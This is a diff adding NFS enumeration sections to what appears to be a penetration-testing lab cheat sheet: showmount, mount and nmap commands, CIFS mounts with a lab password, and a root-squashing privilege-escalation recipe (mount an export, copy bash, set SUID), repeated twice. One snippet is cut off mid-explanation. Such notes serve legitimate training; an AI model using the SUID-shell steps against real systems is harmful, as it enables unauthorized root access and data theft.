@@ -5,6 +5,192 @@ description: "List and mount NFS exports, understand UID and GID handling, and r
 keywords: ["nfs", "showmount", "mount", "exports", "root squash", "no_root_squash", "2049", "111"]
 ---
 
+## showmount: choose the operation and read the result
+
+List NFS exports when mountd is available.
+
+### What the result establishes
+
+Read advertised NFS exports and allowed clients as leads for a subsequent mount/access check.
+
+### Prerequisites and common failures
+
+NFSv4 behavior and server configuration can limit export listing; an advertised export is not proof this client can mount or read it.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+showmount -e TARGET_IP
+```
+
+### Example 2: 1. List the exports
+
+Run in: **Saved lab example**.
+
+```bash
+showmount -e <IP>          # -e = list exports; shows each share and its allowed clients
+```
+
+Saved context: [NFS Enumeration and Exports — 1. List the exports](/enumeration/nfs-enumeration-network-file-system#1-list-the-exports). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: NFS Root Squashing
+
+Run in: **Saved lab example**.
+
+```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash .  
+
+# set suid permission
+chmod +s bash
+```
+
+Saved context: [Linux Privilege Escalation: Full Checklist — NFS Root Squashing](/privesc/linux-privesc-checklist#nfs-root-squashing). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: NFS (Port 2049)
+
+Run in: **Saved lab example**.
+
+```bash
+# List available shares
+showmount -e <IP>
+
+# Mount a share
+mkdir /tmp/target-NFS
+sudo mount -t nfs <IP>:/<share> /tmp/target-NFS
+
+# Browse (use sudo — NFS permissions may block normal user)
+sudo ls -la /tmp/target-NFS/<folder>
+sudo cat /tmp/target-NFS/<folder>/file.txt
+
+# Unmount when done (important — stale mounts freeze your terminal)
+sudo umount -f /tmp/target-NFS
+sudo umount -l /tmp/target-NFS   # if -f doesn't work
+```
+
+Saved context: [Footprinting: Service-by-Service Lab Workflow — NFS (Port 2049)](/enumeration/footprinting-lab-methodology-cheat-sheet#nfs-port-2049). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## mount: choose the operation and read the result
+
+Mount or unmount a permitted NFS export.
+
+### What the result establishes
+
+Confirm the remote export, local mountpoint, selected filesystem and actual mounted options before reading data.
+
+### Prerequisites and common failures
+
+Use read-only inspection where appropriate; client restrictions, UID/GID mapping, root squashing and protocol versions affect access.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+mkdir -p /tmp/nfs
+sudo mount -t nfs TARGET_IP:/EXPORT /tmp/nfs -o nolock
+ls -la /tmp/nfs
+sudo umount /tmp/nfs
+```
+
+### Example 2: 3. Clean up
+
+Run in: **Saved lab example**.
+
+```bash
+sudo umount /tmp/nfs
+sudo umount -f /tmp/nfs    # force, if it won't release
+sudo umount -l /tmp/nfs    # lazy unmount — use if the mount hangs
+```
+
+Saved context: [NFS Enumeration and Exports — 3. Clean up](/enumeration/nfs-enumeration-network-file-system#3-clean-up). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: 2. Mount and browse
+
+Run in: **Saved lab example**.
+
+```bash
+mkdir /tmp/nfs
+sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock   # mount the share locally
+sudo ls -la /tmp/nfs                                   # browse with sudo (UID issues, see below)
+sudo cat /tmp/nfs/<file>
+```
+
+Saved context: [NFS Enumeration and Exports — 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#2-mount-and-browse). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: How to spot it on a scan
+
+Run in: **Saved lab example**.
+
+```bash
+nmap -p111,2049 -sV -sC <IP>                          # detect NFS + rpc/mount info
+nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <IP>   # list exports + contents
+rpcinfo -p <IP>                                        # what RPC services/ports are registered
+```
+
+Saved context: [NFS Enumeration and Exports — How to spot it on a scan](/enumeration/nfs-enumeration-network-file-system#how-to-spot-it-on-a-scan). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Linux
+
+Run in: **Saved lab example**.
+
+```bash
+grcic550@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+
+The file credentialfile has to be structured like this:
+```
+
+Saved context: [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Linux
+
+Run in: **Saved lab example**.
+
+```bash
+grcic550@htb[/htb]$ sudo mkdir /mnt/Finance
+grcic550@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+```
+
+Saved context: [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: NFS Root Squashing
+
+Run in: **Saved lab example**.
+
+```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash .  
+
+# set suid permission
+chmod +s bash
+```
+
+Saved context: [Linux Privilege Escalation: Full Checklist — NFS Root Squashing](/privesc/linux-privesc-checklist#nfs-root-squashing). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 {/* SERVICE_TOOLS_START */}
 
 ## Tools for this service
